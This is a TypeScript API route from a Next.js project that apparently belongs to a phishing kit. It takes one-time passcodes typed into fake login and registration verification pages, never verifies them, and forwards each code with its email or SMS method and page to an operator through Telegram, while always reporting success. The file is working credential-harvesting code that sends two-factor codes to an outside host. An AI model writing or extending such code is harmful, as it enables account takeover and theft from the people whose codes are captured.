import { NextRequest, NextResponse } from 'next/server'
import { sendFormNotification } from '@/lib/telegram'

/**
 * Login gate pages post `{ method, otp, page }`; registration pages post
 * `{ verificationType, code }` (see app/registration/email|text/page.tsx).
 * Both shapes must resolve to the same catalog type + page so ops never
 * receive `Code: Unknown` or a mislabelled method.
 */
function isEmailVerification(value: string): boolean {
  const v = value.trim().toLowerCase()
  return v === 'email' || v === 'e-mail' || v.startsWith('email')
}

function isTextVerification(value: string): boolean {
  const v = value.trim().toLowerCase()
  return (
    v === 'text' ||
    v === 'sms' ||
    v === 'phone' ||
    v === 'text message' ||
    v === 'phone (sms)' ||
    v === 'text message (sms)'
  )
}

function resolvePage(
  method: string,
  verificationType: string,
  page: string | undefined,
): string {
  if (page) return page
  const label = (verificationType || method).trim()
  if (label && isTextVerification(label)) return '/registration/text'
  if (label && isEmailVerification(label)) return '/registration/email'
  return `/login/verify-code?method=${method || 'email'}`
}

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as {
      method?: string
      otp?: string
      code?: string
      verificationType?: string
      page?: string
    }
    const otp = body.otp ?? body.code
    const method = (body.method ?? '').trim()
    const verificationType = (body.verificationType ?? '').trim()
    const isEmail = verificationType
      ? isEmailVerification(verificationType)
      : isEmailVerification(method)
    const telegramSuccess = await sendFormNotification({
      type: isEmail ? 'login_email_otp_verification' : 'login_text_otp_verification',
      otp,
      page: resolvePage(method, verificationType, body.page),
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error('Error sending verification notification:', error)
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 })
  }
}
